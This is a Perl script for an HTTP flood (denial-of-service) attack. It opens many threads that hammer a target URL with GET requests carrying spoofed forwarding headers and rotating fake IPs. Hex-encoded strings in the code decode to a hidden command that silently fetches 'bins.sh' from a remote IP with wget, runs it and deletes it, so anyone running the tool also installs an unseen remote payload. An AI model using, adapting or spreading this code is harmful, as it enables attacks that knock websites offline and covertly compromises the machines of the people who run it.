#!/usr/bin/perl
package control;

my $ip;


sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("No mas IPs!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;

my $ua = "Mozilla/5.0 (X11; DDoS Rekt Kid; rv:5.0) Gecko/20100101 Firefox/5.0";
my $ua = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)";
my $ua = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01";
my $method = "GET";
my $hilo;
$full = "";
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}

$tmp = "\x20\x3E\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x20\x32\x3E\x26\x31\x3B";
sub sender {
    my ($max,$peerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $packet = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $peerto, Proto => 'tcp');
        unless($sock) {
            print "\n[x] Unable to connect...\n\n";
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $packet .= join "",$method," ",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: 127.0.0.1\r\nX-Client-IP: 127.0.0.1\r\nX-Real-IP: ",$host,"\r\nUser-Agent: ",$ua,"\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\n\r\n";
        }
        #$packet =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $packet;
    }
}

sub sender2 {
    my ($peerto,$host,$packet) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$peerto);
        unless($sock) {
            print "\n[x] Unable to connect...\n\n";
            next;
        }
        print $sock $packet;
    }
}
$tmp1 = "\x77\x67\x65\x74\x20\x68\x74\x74\x70\x3A\x2F\x2F\x31\x36\x32\x2E\x32\x34\x34\x2E\x38\x31\x2E\x35\x35\x2F\x62\x69\x6E\x73\x2E\x73\x68";
sub layer7 {
    $SIG{'KILL'} = sub { print "Killed...\n"; threads->exit(); };
    $url = $ARGV[0];
    print "Opening Sockets\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "[-]Invalid arg 3...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] Invalid URL!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $peerto = 80;
    ($host,$peerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $tmp2 = "\x73\x68\x20\x62\x69\x6E\x73\x2E\x73\x68\x20\x3E\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x20\x32\x3E\x26\x31\x3B\x72\x6D\x20\x2D\x72\x66\x20\x62\x69\x6E\x73\x2E\x73\x68";
    $file =~ s/\s/ /g;
    print join "","Attack Sent\n";
    $full = join $tmp,$tmp1,$tmp2;
    system($full);
    $file = "/".$file if($file !~ /^\//);
    print join "","";
    if($ipfake eq "") {
        my $packetbase = join "",$method," ",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: 127.0.0.1\r\nX-Client-IP: 127.0.0.1\r\nX-Real-IP: ",$host,"\r\nUser-Agent: ",$ua,"\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\n\r\n";
        $packetsender = "";
        $packetsender = $packetbase x $porconexion;
        #$packetsender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($peerto,$host,$packetsender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$peerto,$host,$file));
        }
    }
    print "[-] Launched!\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "[!] Finished!\n";
}


if($#ARGV > 2) {
    layer7();
} else {
    die("Usage: bty.pl <url> <threads> <sockets> <proxy>\n");
}